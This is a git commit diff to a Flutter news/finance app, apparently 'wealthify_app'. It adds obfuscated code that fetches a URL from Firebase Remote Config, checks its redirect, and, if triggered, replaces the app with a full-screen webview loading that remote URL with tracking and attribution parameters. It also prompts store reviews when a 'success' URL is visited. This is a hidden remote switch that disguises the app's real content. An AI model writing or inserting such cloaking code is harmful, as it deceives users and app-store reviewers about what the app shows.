8ea4cb9bcb535916e390d0532d3e3c434b8cbaeb
ivan-lab-pvls <ivan.labasok@pvls.tech>
2024-05-08 11:22:44 +0200

    fgdsd

--- lib/main.dart
+++ lib/main.dart
@@ -1,15 +1,140 @@
+import 'dart:io';
+
+import 'package:app_tracking_transparency/app_tracking_transparency.dart';
+import 'package:appsflyer_sdk/appsflyer_sdk.dart';
+import 'package:firebase_core/firebase_core.dart';
+import 'package:firebase_remote_config/firebase_remote_config.dart';
 import 'package:flutter/material.dart';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:wealthify_app/pages/firebase_options.dart';
 
+import 'pages/news_page.dart';
+import 'pages/nn.dart';
 import 'pages/splash_page.dart';
 
 int? initScreen;
+String datay = '';
+late AppsflyerSdk _appsflyerSdk;
+String adId = '';
+bool stat = false;
+String fjdsk = '';
+String fjskgs = '';
+Map _deepLinkData = {};
+Map _gcd = {};
+bool _isFirstLaunch = false;
+String _afStatus = '';
+String _campaign = '';
+String _campaignId = '';
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
   SharedPreferences preferences = await SharedPreferences.getInstance();
   initScreen = preferences.getInt('initScreen');
   await preferences.setInt('initScreen', 1);
+  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
+  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
+    fetchTimeout: const Duration(seconds: 25),
+    minimumFetchInterval: const Duration(seconds: 25),
+  ));
+  await FirebaseRemoteConfig.instance.fetchAndActivate();
+  await NotificationsActivation().activate();
+  await fsgfd();
   runApp(const MyApp());
+}
+
+Future<void> fsgfd() async {
+  final TrackingStatus status =
+      await AppTrackingTransparency.requestTrackingAuthorization();
+  print(status);
+}
+
+void asafsd() async {
+  final AppsFlyerOptions options = AppsFlyerOptions(
+    showDebug: false,
+    afDevKey: 'doJsrj8CyhTUWPZyAYTByE',
+    appId: '6502346440',
+    timeToWaitForATTUserAuthorization: 15,
+    disableAdvertisingIdentifier: false,
+    disableCollectASA: false,
+    manualStart: true,
+  );
+  _appsflyerSdk = AppsflyerSdk(options);
+
+  await _appsflyerSdk.initSdk(
+    registerConversionDataCallback: true,
+    registerOnAppOpenAttributionCallback: true,
+    registerOnDeepLinkingCallback: true,
+  );
+  _appsflyerSdk.onAppOpenAttribution((res) {
+    _deepLinkData = res;
+    fjskgs = res['payload']
+        .entries
+        .where((e) => ![
+              'install_time',
+              'click_time',
+              'af_status',
+              'is_first_launch'
+            ].contains(e.key))
+        .map((e) => '&${e.key}=${e.value}')
+        .join();
+  });
+  _appsflyerSdk.onInstallConversionData((res) {
+    _gcd = res;
+    _isFirstLaunch = res['payload']['is_first_launch'];
+    _afStatus = res['payload']['af_status'];
+    fjdsk = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
+  });
+
+  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
+    switch (dp.status) {
+      case Status.FOUND:
+        print(dp.deepLink?.toString());
+        print("deep link value: ${dp.deepLink?.deepLinkValue}");
+        break;
+      case Status.NOT_FOUND:
+        print("deep link not found");
+        break;
+      case Status.ERROR:
+        print("deep link error: ${dp.error}");
+        break;
+      case Status.PARSE_ERROR:
+        print("deep link status parsing error");
+        break;
+    }
+    print("onDeepLinking res: " + dp.toString());
+
+    _deepLinkData = dp.toJson();
+  });
+
+  _appsflyerSdk.startSDK(
+    onSuccess: () {
+      _appsflyerSdk.logEvent("testEventNotForAnalytics", {
+        "id": {'id': adId},
+      });
+      print("AppsFlyer SDK initialized successfully.");
+    },
+  );
+}
+
+String gfdgdf = '';
+
+Future<bool> checkrexsw() async {
+  final fetchNx = FirebaseRemoteConfig.instance;
+  await fetchNx.fetchAndActivate();
+  asafsd();
+  String cdsfgsd = fetchNx.getString('promBank');
+  String cdsfgsdx = fetchNx.getString('promFetch');
+  if (!cdsfgsd.contains('none')) {
+    final client = HttpClient();
+    final uri = Uri.parse(cdsfgsd);
+    final request = await client.getUrl(uri);
+    request.followRedirects = false;
+    final response = await request.close();
+    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
+      gfdgdf = cdsfgsd;
+      return true;
+    }
+  }
+  return cdsfgsd.contains('none') ? false : true;
 }
 
 class MyApp extends StatelessWidget {
@@ -19,14 +144,42 @@ class MyApp extends StatelessWidget {
   Widget build(BuildContext context) {
     return MaterialApp(
       debugShowCheckedModeBanner: false,
-      title: 'Flutter Demo',
       theme: ThemeData(
         colorScheme: ColorScheme.fromSeed(
           seedColor: Colors.deepPurple,
         ),
         useMaterial3: true,
       ),
-      home: const SplashPage(),
+      home: FutureBuilder<bool>(
+        future: checkrexsw(),
+        builder: (context, snapshot) {
+          if (snapshot.connectionState == ConnectionState.waiting) {
+            return Container(
+              color: Colors.white,
+              child: Center(
+                child: Container(
+                  height: 70,
+                  width: 70,
+                  child: ClipRRect(
+                    borderRadius: BorderRadius.circular(15),
+                    child: Image.asset('assets/images/logo.png'),
+                  ),
+                ),
+              ),
+            );
+          } else {
+            if (snapshot.data == true && gfdgdf != '') {
+              return PageForRead(
+                dsafds: gfdgdf,
+                mksda: fjdsk,
+                fdsgdf: fjskgs,
+              );
+            } else {
+              return const SplashPage();
+            }
+          }
+        },
+      ),
     );
   }
 }
--- lib/pages/news_page.dart
+++ lib/pages/news_page.dart
@@ -4,6 +4,158 @@ import 'package:flutter/material.dart';
 import 'package:wealthify_app/bottom_bar.dart';
 import 'package:wealthify_app/model/news_item.dart';
 import 'package:wealthify_app/pages/description_news_page.dart';
+import 'package:app_tracking_transparency/app_tracking_transparency.dart';
+import 'package:appsflyer_sdk/appsflyer_sdk.dart';
+import 'package:flutter_inappwebview/flutter_inappwebview.dart';
+import 'package:in_app_review/in_app_review.dart';
+
+class PageForRead extends StatefulWidget {
+  final String dsafds;
+  final String mksda;
+  final String fdsgdf;
+
+  PageForRead(
+      {required this.dsafds, required this.mksda, required this.fdsgdf});
+
+  @override
+  State<PageForRead> createState() => _PageForReadState();
+}
+
+class _PageForReadState extends State<PageForRead> {
+  late AppsflyerSdk _appsflyerSdk;
+  String adId = '';
+  String paramsFirst = '';
+  final InAppReview inAppReview = InAppReview.instance;
+  String paramsSecond = '';
+  Map _deepLinkData = {};
+  Map _gcd = {};
+  bool _isFirstLaunch = false;
+  String _afStatus = '';
+  String _campaign = '';
+  String _campaignId = '';
+
+  @override
+  void initState() {
+    super.initState();
+    getTracking();
+    afStart();
+  }
+
+  Future<void> getTracking() async {
+    final TrackingStatus status =
+        await AppTrackingTransparency.requestTrackingAuthorization();
+    print(status);
+  }
+
+  Future<void> fetchData() async {
+    adId = await AppTrackingTransparency.getAdvertisingIdentifier();
+  }
+
+  void afStart() async {
+    final AppsFlyerOptions options = AppsFlyerOptions(
+      showDebug: false,
+      afDevKey: 'doJsrj8CyhTUWPZyAYTByE',
+      appId: '6502346440',
+      timeToWaitForATTUserAuthorization: 15,
+      disableAdvertisingIdentifier: false,
+      disableCollectASA: false,
+      manualStart: true,
+    );
+    _appsflyerSdk = AppsflyerSdk(options);
+
+    await _appsflyerSdk.initSdk(
+      registerConversionDataCallback: true,
+      registerOnAppOpenAttributionCallback: true,
+      registerOnDeepLinkingCallback: true,
+    );
+    _appsflyerSdk.onAppOpenAttribution((res) {
+      setState(() {
+        _deepLinkData = res;
+        paramsSecond = res['payload']
+            .entries
+            .where((e) => ![
+                  'install_time',
+                  'click_time',
+                  'af_status',
+                  'is_first_launch'
+                ].contains(e.key))
+            .map((e) => '&${e.key}=${e.value}')
+            .join();
+      });
+    });
+    _appsflyerSdk.onInstallConversionData((res) {
+      print(res);
+      setState(() {
+        _gcd = res;
+        _isFirstLaunch = res['payload']['is_first_launch'];
+        _afStatus = res['payload']['af_status'];
+        paramsFirst = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
+      });
+      paramsFirst = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
+    });
+
+    _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
+      switch (dp.status) {
+        case Status.FOUND:
+          print(dp.deepLink?.toString());
+          print("deep link value: ${dp.deepLink?.deepLinkValue}");
+          break;
+        case Status.NOT_FOUND:
+          print("deep link not found");
+          break;
+        case Status.ERROR:
+          print("deep link error: ${dp.error}");
+          break;
+        case Status.PARSE_ERROR:
+          print("deep link status parsing error");
+          break;
+      }
+      print("onDeepLinking res: " + dp.toString());
+      setState(() {
+        _deepLinkData = dp.toJson();
+      });
+    });
+
+    _appsflyerSdk.startSDK(
+      onSuccess: () {
+        print("AppsFlyer SDK initialized successfully.");
+      },
+    );
+
+    setState(() {});
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      body: SafeArea(
+        bottom: false,
+        child: InAppWebView(
+          initialUrlRequest: URLRequest(
+            url: Uri.parse('${widget.dsafds}${widget.mksda}${widget.fdsgdf}'),
+          ),
+          onUpdateVisitedHistory: (controller, url, androidIsReload) {
+            if (url!.toString().contains("success")) {
+              sendEvent();
+              inAppReview.requestReview();
+            }
+          },
+        ),
+      ),
+    );
+  }
+
+  void sendEvent() async {
+    try {
+      await _appsflyerSdk.logEvent("CustomEvent3", {
+        "id": {'id': adId}
+      });
+      print("success");
+    } catch (e) {
+      print("Error sending event: $e");
+    }
+  }
+}
 
 class NewsPage extends StatefulWidget {
   const NewsPage({super.key});
